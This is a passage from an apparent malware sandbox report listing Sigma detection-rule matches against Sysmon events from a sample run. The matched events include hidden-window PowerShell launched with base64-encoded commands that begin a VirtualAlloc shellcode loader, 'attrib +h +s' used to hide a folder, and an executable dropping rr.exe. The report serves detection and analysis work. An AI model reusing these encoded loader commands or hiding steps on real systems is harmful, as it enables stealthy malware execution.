AAiADsAaQBlAHgAIAAiACYAIAAkAHAAdQBCAGgAIAAkAHYARABFAEIAIAAkAGUAIgB9AGUAbABzAGUAewA7AGkAZQB4ACAAIgAmACAAcABvAHcAZQByAHMAaABlAGwAbAAgACQAdgBEAEUAQgAgACQAZQAiADsAfQA=; UtcTime=1684197952; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c powershell -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAb [TRUNCATED]; CommandLine=powershell  -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAb [TRUNCATED]; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=powershell  -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAb [TRUNCATED]; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -EncodedCommand JABZAFEAZwBjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIA [TRUNCATED]; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Non Interactive PowerShell Process Spawned",
                                                                       "rule_description":  "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
                                                                       "rule_author":  "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c powershell -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAb [TRUNCATED]; CommandLine=powershell  -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAb [TRUNCATED]; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; EventID=1; ParentCommandLine=powershell  -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAb [TRUNCATED]; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -EncodedCommand JABZAFEAZwBjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIA [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "62ce96b648991749ff9b9ccc7dafa1d8da64d6490e9f469683f00fa248ef9336",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Set Files as System Files Using Attrib.EXE",
                                                                       "rule_description":  "Detects the execution of \"attrib\" with the \"+s\" flag to mark files as system files",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D21F-6462-1306-000000004400}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D21F-6462-1106-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A5540E9F87D4CB083BDF8269DEC1CFF9,SHA256=9C0378382F4606E3709675CD9E28C43525156B174D0A5CECB68EC4398C31EF1C,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7812; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=attrib  +h +s c:\\\\temp; EventID=1; LogonGuid=C784477D-562A-6441-F1C6-030000000000; LogonId=247537; Image=C:\\Windows\\SysWOW64\\attrib.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c attrib +h +s c:\\\\temp; UtcTime=1684197919; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D231-6462-2006-000000004400}; ProcessId=3348; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D231-6462-1E06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A5540E9F87D4CB083BDF8269DEC1CFF9,SHA256=9C0378382F4606E3709675CD9E28C43525156B174D0A5CECB68EC4398C31EF1C,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7092; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=attrib  +h +s c:\\\\temp; EventID=1; LogonGuid=C784477D-562A-6441-51C7-030000000000; LogonId=247633; Image=C:\\Windows\\SysWOW64\\attrib.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c attrib +h +s c:\\\\temp; UtcTime=1684197937; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D239-6462-2C06-000000004400}; ProcessId=7664; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D239-6462-2A06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A5540E9F87D4CB083BDF8269DEC1CFF9,SHA256=9C0378382F4606E3709675CD9E28C43525156B174D0A5CECB68EC4398C31EF1C,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7540; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=attrib  +h +s c:\\\\temp; EventID=1; LogonGuid=C784477D-562A-6441-51C7-030000000000; LogonId=247633; Image=C:\\Windows\\SysWOW64\\attrib.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c attrib +h +s c:\\\\temp; UtcTime=1684197945; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "764276dba9654bf07d000fa390ae98de360ac172927cf3ef64f2db6c5b9be3b2",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Dynamic CSharp Compile Artefact",
                                                                       "rule_description":  "When C# is compiled dynamically, a .cmdline file will be created as a part of the process.\nCertain processes are not typically observed compiling C# code, but can do so without touching disk.\nThis can be used to unpack a payload for execution\n",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; EventID=11; TargetFilename=C:\\Users\\Bruno\\AppData\\Local\\Temp\\qy55t1l4\\qy55t1l4.cmdline}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "b5386a23355681c43cfbd2f2ccfe4b16ed45324d0d7b5583487a9f302ee1e427",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Creation of an Executable by an Executable",
                                                                       "rule_description":  "Detects the creation of an executable by another executable",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7692; TargetFilename=C:\\Temp\\rr.exe; RuleName=EXE; CreationUtcTime=1684197920; UtcTime=1684197920; ProcessGuid={C784477D-D21D-6462-0E06-000000004400}; Image=C:\\Users\\george\\Desktop\\file.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=3812; TargetFilename=C:\\Temp\\rr.exe; RuleName=EXE; CreationUtcTime=1684197920; UtcTime=1684197938; ProcessGuid={C784477D-D22F-6462-1B06-000000004400}; Image=C:\\Users\\george\\Desktop\\file.exe}"
                                                                                             },
